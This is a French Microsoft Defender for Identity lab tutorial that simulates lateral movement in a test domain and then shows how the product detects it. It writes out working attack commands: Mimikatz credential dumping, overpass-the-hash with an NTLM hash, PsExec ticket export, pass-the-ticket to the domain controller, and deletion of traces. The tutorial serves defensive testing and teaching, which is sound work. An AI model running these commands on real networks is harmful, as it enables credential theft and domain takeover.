---
title: Playbook du mouvement latéral des alertes de sécurité Microsoft Defender pour Identity
description: Le playbook Microsoft Defender pour Identity explique comment simuler des menaces de mouvement latéral à des fins de détection par Defender pour Identity.
author: shsagir
ms.author: shsagir
manager: shsagir
ms.date: 10/26/2020
ms.topic: tutorial
ms.collection: M365-security-compliance
ms.service: azure-advanced-threat-protection
ms.reviewer: itargoet
ms.suite: ems
ms.openlocfilehash: f51c707c2ac01fbbd16258efab8c0ac74d3076b0
ms.sourcegitcommit: e2227c0b0e5aaa5163dc56d4131ca82f8dca8fb0
ms.translationtype: HT
ms.contentlocale: fr-FR
ms.lasthandoff: 11/18/2020
ms.locfileid: "94849092"
---
# <a name="tutorial-lateral-movement-playbook"></a>Tutoriel : Playbook de mouvement latéral

Le playbook sur le mouvement latéral est le troisième de la série de quatre tutoriels sur les alertes de sécurité [!INCLUDE [Product long](includes/product-long.md)]. L’objectif du labo des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] est d’illustrer les fonctionnalités de **[!INCLUDE [Product short](includes/product-short.md)]** concernant l’identification et la détection des activités suspectes et des attaques potentielles du réseau. Le playbook explique comment tester certaines détections *discrètes* de [!INCLUDE [Product short](includes/product-short.md)]. Il se concentre sur les fonctionnalités liées à la *signature* de [!INCLUDE [Product short](includes/product-short.md)]. Il ne comprend ni détections avancées de type Machine Learning, ni détections comportementales des utilisateurs et des entités (qui impliquent une période d’apprentissage sur du trafic réseau réel pouvant aller jusqu’à 30 jours). Pour plus d’informations sur les différents tutoriels de cette série, consultez la [vue d’ensemble des labos des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)]](playbook-lab-overview.md).

Ce playbook montre certaines détections de menaces de type chemin de mouvement latéral et certains services d’alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] en simulant une attaque avec des outils de piratage et d’attaque courants, réels et accessibles au public.

Ce didacticiel vous apprendra à effectuer les opérations suivantes :

> [!div class="checklist"]
>
> - collecter des codes de hachage NTLM et simuler une attaque Overpass-the-Hash pour obtenir un ticket TGT (Ticket Granting) Kerberos ;
> - usurper l’identité d’un autre utilisateur, se déplacer latéralement sur le réseau et collecter d’autres informations d’identification ;
> - simuler une attaque Pass-the-Ticket pour accéder au contrôleur de domaine ;
> - passer en revue les alertes de sécurité du mouvement latéral dans [!INCLUDE [Product short](includes/product-short.md)].

## <a name="prerequisites"></a>Prérequis

1. [Un labo des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] terminé](playbook-setup-lab.md)
    - Nous vous recommandons de suivre d’aussi près que possible les instructions de configuration du labo. Plus votre labo sera proche de la configuration suggérée, plus les procédures de test [!INCLUDE [Product short](includes/product-short.md)] seront faciles à suivre.

2. [Achèvement du didacticiel du playbook de reconnaissance](playbook-reconnaissance.md)

## <a name="lateral-movement"></a>Déplacement latéral

Grâce à nos attaques simulées dans le tutoriel précédent, le playbook de reconnaissance, nous avons obtenu des informations réseau détaillées. À l’aide de ces informations, notre objectif durant cette phase de mouvement latéral du labo est d’accéder aux adresses IP de valeur critique déjà découvertes et de voir les alertes de [!INCLUDE [Product short](includes/product-short.md)] sur le mouvement. Dans la simulation de labo de reconnaissance précédente, nous avons identifié l’adresse IP cible 10.0.24.6, où les informations d’identification de l’ordinateur de SamiraA ont été exposées. Nous allons simuler différentes méthodes d’attaque pour essayer de nous déplacer latéralement sur le domaine.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Vider les informations d’identification en mémoire à partir de VictimPC

Au cours de nos attaques de reconnaissance fictives, **VictimPC** n’a pas été exposé uniquement aux informations d’identification de JeffL. Il y a d’autres comptes utiles à découvrir sur cet ordinateur. Pour obtenir un mouvement latéral à l’aide de **VictimPC**, nous allons tenter d’énumérer des informations d’identification en mémoire sur la ressource partagée. Le vidage des informations d’identification en mémoire à l’aide de **mimikatz** est une méthode d’attaque populaire avec un outil commun.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. Ouvrez une **invite de commandes avec élévation de privilèges** sur **VictimPC**.
1. Accédez au dossier d’outils où vous avez enregistré Mimikatz et exécutez la commande suivante :

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```

1. Ouvrez **c:\\temp\\victimpc.txt** pour afficher les informations d’identification collectées et écrites par Mimikatz dans le fichier txt.
    ![Résultat de Mimikatz, y compris le code de hachage NTLM de RonHD](media/playbook-lateral-sekurlsa-logonpasswords-output.png)

1. Nous avons pu collecter le code de hachage NTLM de RonHD à partir de la mémoire avec mimikatz. Nous aurons besoin du code de hachage NTLM sous peu.

    > [!Important]
    >
    > - Il est prévu et normal que les codes de hachage illustrés dans cet exemple soient différents des codes de hachage que vous voyez dans votre propre environnement de labo. L’objectif de cet exercice est de vous aider à comprendre comment les codes de hachage ont été obtenus, d’obtenir leurs valeurs et de les utiliser dans les étapes suivantes.
    > - Les informations d’identification du compte d’ordinateur ont également été exposées lors de cette collecte. Alors que la valeur d’informations d’identification du compte d’ordinateur n’est pas utile dans notre labo actuel, n’oubliez pas de qu'il s’agit d’un autre moyen utilisé par les attaquants réel pour obtenir un mouvement latéral dans votre environnement.

### <a name="gather-more-information-about-the-ronhd-account"></a>Collecter plus d’informations sur le compte RonHD

Un attaquant peut ne pas savoir initialement qui est RonHD ou ne pas connaître sa valeur en tant que cible. Tout qu’il sait est qu’il peut utiliser les informations d’identification s’il est avantageux de le faire. Toutefois, à l’aide de la commande **net** nous, agissant comme un attaquant, pouvons découvrir de quels groupes RonHD est membre.

À partir de **VictimPC**, exécutez la commande suivante :

```dos
net user ronhd /domain
```

![Reconnaissance sur le compte de RonHD](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Il ressort des résultats que RonHD est membre du groupe de sécurité « Support technique ». Nous savons que RonHD nous donne des privilèges liés au compte *et* avec le groupe de sécurité du support technique.

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

À l’aide d’une technique courante appelée **Overpass-the-Hash**, le code de hachage NTLM collecté est utilisé pour obtenir un Ticket TGT (Ticket Granting). Avec le ticket TGT d’un utilisateur, un attaquant peut usurper l’identité un utilisateur compromis tels que RonHD. En usurpant l’identité en tant que RonHD, nous pouvons accéder à n’importe quelle ressource de domaine à laquelle l’utilisateur compromis ou ses groupes de sécurité respectifs ont accès.

1. À partir de **VictimPC**, accédez au répertoire contenant le dossier **Mimikatz.exe**. emplacement de stockage sur votre système de fichiers et exécutez la commande suivante :

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
    ```

    > [!Note]
    > Si votre code de hachage pour RonHD était différent dans les étapes précédentes, remplacez le code de hachage NTLM ci-dessus par le code de hachage collecté auprès de *victimpc.txt*.

    ![Overpass-the-hash par le biais de mimikatz](media/playbook-lateral-opth1.png)

1. Vérifiez qu’une nouvelle invite de commandes s’ouvre. Elle s’exécute en tant que RonHD, mais il est possible que cela ne soit pas *encore* évident. Ne fermez pas la nouvelle invite de commande, car vous allez l’utiliser ensuite.

[!INCLUDE [Product short](includes/product-short.md)] ne peut pas détecter qu’un code de hachage a été transmis sur une ressource locale. Il repère qu’un code de hachage est **utilisé à partir d’une ressource pour accéder à une autre ressource ou à un autre service**.

### <a name="additional-lateral-move"></a>Déplacement latéral supplémentaire

Maintenant, avec les informations d’identification de RonHD, pouvons-nous accéder aux informations d’identification de JeffL, ce qui n’était pas possible avant ?
Nous allons utiliser **PowerSploit** ```Get-NetLocalGroup``` pour nous aider à répondre à cette question.

1. Dans la console de commande ouverte en raison de notre attaque précédente, en cours d’exécution en tant que RonHD, exécutez les éléments suivants :

    ```powershell
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
    Get-NetLocalGroup 10.0.24.6
    ```

    ![Obtenir les administrateurs locaux pour 10.0.24.6 via PowerSploit](media/playbook-lateral-adminpcsamr.png)

    Dans les coulisses, cet exemple utilise la gestion des actifs logiciels à distance pour identifier les administrateurs locaux pour l’adresse IP que nous avons découvert précédemment et qui a été exposée à un compte d’administrateur de domaine.

    Notre résultat doit ressembler à :

    ![Résultat de PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

    Cet ordinateur a deux administrateurs locaux, l’administrateur intégré « ContosoAdmin » et « Support technique ». Nous savons que RonHD est membre du groupe de sécurité « Support technique ». On nous a également donné le nom de l’ordinateur, AdminPC. Étant donné que nous avons les informations d’identification de RonHD, nous devrions pouvoir les utiliser pour nous déplacer latéralement vers AdminPC et d’accéder à cet ordinateur.

1. À partir de la *même invite de commandes, qui s’exécute dans le contexte de RonHD*, tapez **quitter** sortir de PowerShell si nécessaire. Ensuite, exécutez la commande suivante :

    ```dos
    dir \\adminpc\c$
    ```

1. Nous avons pu accéder à AdminPC. Voyons quels tickets nous avons. Dans la même invite de commandes, exécutez la commande suivante :

    ```dos
    klist
    ```

    ![Utilisez klist pour nous montrer des tickets Kerberos dans notre processus cmd.exe en cours](media/playbook-lateral-klist.png)

Vous pouvez voir que, pour ce processus particulier, nous avons un TGT de RonHD en mémoire. Nous avons effectué avec succès une attaque Overpass-the-Hash dans notre labo. Nous avons converti le code de hachage NTLM compromis précédemment et l’avons utilisé pour obtenir un TGT Kerberos. Ce TGT Kerberos a été ensuite utilisé pour accéder à une autre ressource réseau, dans le cas présent, AdminPC.

### <a name="overpass-the-hash-detected-in-product-short"></a>Détection d’une attaque Overpass-the-Hash dans [!INCLUDE [Product short](includes/product-short.md)]

En examinant la console [!INCLUDE [Product short](includes/product-short.md)], nous pouvons voir les informations suivantes :

![Détection de l’attaque Overpass-the-Hash par [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-lateral-opthdetection.png)

[!INCLUDE [Product short](includes/product-short.md)] a détecté que le compte de RonHD a été compromis sur VictimPC, puis utilisé pour obtenir un TGT Kerberos. Si nous cliquons sur le nom de RonHD dans l’alerte, nous sommes dirigés vers la chronologie des activités logiques de RonHD, où nous pouvons approfondir notre recherche.

![Afficher la détection dans la chronologie des activités logiques](media/playbook-lateral-opthlogicalactivity.png)

Dans le centre d’opérations de sécurité, l’attention de notre analyste de sécurité est attirée par les informations d’identification compromises et il peut examiner rapidement les ressources ayant fait l’objet d’un accès.

## <a name="domain-escalation"></a>Élévation de domaine

Du fait de notre attaque simulée, nous n’avons pas seulement accès à AdminPC, mais nous avons également validé des privilèges d’administrateur sur AdminPC. Nous pouvons maintenant nous déplacer latéralement vers AdminPC et collecter des informations d’identification supplémentaires.

Nous allons ici :

- préparer Mimikatz sur AdminPC ;
- collecter des tickets sur AdminPC ;
- effectuer Pass-the-ticket pour devenir SamiraA.

### <a name="pass-the-ticket"></a>Pass-the-ticket

À partir de l’invite de commandes exécutée dans le contexte de *RonHD* sur **VictimPC**, accédez à l’emplacement où se trouvent nos outils d’attaque courants. Ensuite, exécutez *xcopy* pour les déplacer vers l’ordinateur AdminPC :

```dos
xcopy mimikatz.exe \\adminpc\c$\temp
```

Appuyez sur `d` lorsque vous y êtes invité, en indiquant que le dossier « temp » est un répertoire sur AdminPC.

![Copier des fichiers vers AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

Avec Mimikatz préparé sur AdminPC, nous allons utiliser PsExec pour l’exécuter à distance.

1. Allez à l’emplacement de PsExec et exécutez la commande suivante :

    ```dos
    PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
    ```

    Cette commande exécute et exporte les tickets trouvés dans le processus LSASS.exe et les place dans le répertoire actuel, sur AdminPC.

1. Nous devons copier les tickets pour les faire revenir d’AdminPC à VictimPC. Comme nous nous intéressons uniquement aux tickets de SamiraA pour cet exemple, exécutez la commande suivante :

    ```dos
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```

    ![Exporter les informations d’identification collectées d’AdminPC vers VictimPC](media/playbook-escalation-export_tickets2.png)

1. Nous allons effacer nos traces sur AdminPC en supprimant nos fichiers.

    ```dos
    rmdir \\adminpc\c$\temp /s /q
    ```

    > [!Note]
    > Les pirates plus sophistiquées ne touchent pas au disque lorsqu’ils exécutent du code arbitraire sur un ordinateur après avoir obtenu des privilèges d’administrateur sur ce dernier.

    Sur notre **VictimPC**, ces tickets collectés se trouvent dans notre dossier **c:\temp\adminpc_tickets** :

    ![C:\temp\tickets est résultat mimikatz exporté à partir d’AdminPC](media/playbook-escalation-export_tickets4.png)

### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

Avec les tickets localement sur VictimPC, il est maintenant temps de devenir SamiraA par « En passant le Ticket ».

1. À partir de l’emplacement de **Mimikatz** sur le système de fichiers de **VictimPC**, ouvrez une nouvelle **invite de commandes avec élévation de privilèges** et exécutez la commande suivante :

    ```dos
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```

    ![Importez les tickets volés dans le processus cmd.exe](media/playbook-escalation-ptt1.png)

1. Dans la même invite de commandes avec élévation de privilèges, vous devez valider que la session d’invite de commandes comprend les tickets adéquats. Exécutez la commande suivante :

    ```dos
    klist
    ```

    ![Exécutez klist pour afficher les tickets importés dans le processus CMD](media/playbook-escalation-ptt2.png)

1. Notez que ces tickets restent inutilisés. En agissant comme un attaquant, nous avons réussi à « passer le ticket ». Nous avons collecté les informations d’identification de SamirA dans AdminPC avant de les passer à un autre processus s’exécutant sur VictimPC.

    > [!Note]
    > Comme dans l’attaque Pass-the-Hash, [!INCLUDE [Product short](includes/product-short.md)] ne sait pas que le ticket a été transmis sur la base de l’activité du client local. Cependant, il détecte l’activité *une fois le ticket utilisé*, autrement dit, exploité pour accéder à une autre ressource ou à un autre service.

1. Terminez votre attaque simulée en accédant au contrôleur de domaine à partir de **VictimPC**. Dans l’invite de commandes maintenant en cours d’exécution avec les tickets de SamirA en mémoire, exécutez :

    ```dos
    dir \\ContosoDC\c$
    ```

    ![Accès au lecteur C de ContosoDC à l’aide des informations d’identification de SamiraA](media/playbook-escalation-ptt3.png)

Opération réussie. Nos attaques fictives nous ont permis d’accéder en tant qu’administrateur à notre contrôleur de domaine et de réussir à compromettre le domaine/la forêt Active Directory de notre labo.

### <a name="pass-the-ticket-detection-in-product-short"></a>Détection Pass-the-Ticket dans [!INCLUDE [Product short](includes/product-short.md)]

La plupart des outils de sécurité n’ont aucun moyen de détecter l’utilisation d’informations d’identification légitimes pour accéder à une ressource légitime. Quels sont en revanche les événements détectés et signalés par [!INCLUDE [Product short](includes/product-short.md)] dans cette chaîne ?

- [!INCLUDE [Product short](includes/product-short.md)] a détecté le vol des tickets de SamiraA sur AdminPC et le mouvement vers VictimPC.
- Le portail [!INCLUDE [Product short](includes/product-short.md)] indique précisément quelles ressources ont été consultées à l’aide des tickets volés.
- Il fournit des informations clés et des preuves pour identifier exactement où commencer votre investigation et quelles mesures prendre pour y remédier.

Les détections [!INCLUDE [Product short](includes/product-short.md)] et les informations sur les alertes ont une valeur critique pour les équipes DFIR (Digital Forensics and Incident Response). Vous pouvez non seulement voir les informations d’identification volées, mais encore découvrir les ressources ayant fait l’objet d’un accès et d’une compromission avec le ticket volé.

![Détection de l’attaque Pass-the-Ticket par [!INCLUDE [Product short](includes/product-short.md)] avec neutralisation sous deux heures](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Cet événement ne s’affichera sur la console [!INCLUDE [Product short](includes/product-short.md)] qu’au bout de **deux heures**. Les événements de ce type sont délibérément supprimés pendant cet intervalle de temps pour réduire les faux positifs.

## <a name="next-steps"></a>Étapes suivantes

La phase suivante dans la chaîne de destruction d’attaque est le contrôle du domaine.

> [!div class="nextstepaction"]
> [Playbook du contrôle de domaine [!INCLUDE [Product short](includes/product-short.md)]](playbook-domain-dominance.md)

## <a name="join-the-community"></a>Rejoindre la communauté

Vous avez d’autres questions ou vous voulez discuter de [!INCLUDE [Product short](includes/product-short.md)] et de la sécurité associée avec d’autres utilisateurs ? Rejoignez la [Communauté [!INCLUDE [Product short](includes/product-short.md)]](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) !
